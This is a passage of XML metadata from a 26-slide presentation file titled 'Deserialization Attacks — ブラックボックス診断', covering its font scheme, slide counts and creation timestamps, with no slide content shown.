    <a:fontScheme name="Deserialization Attacks — ブラックボックス診断">
      <a:majorFont>
        <a:latin typeface="IBM Plex Sa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BM Plex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26</Slides>
  <Notes>26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26</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="2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Deserialization Attacks — ブラックボックス診断</dc:title>
  <dc:subject/>
  <dc:creator/>
  <cp:lastModifiedBy/>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-10-09T07:21:22Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-09T07:21:22Z</dcterms:modified>
</cp:coreProperties>
</file>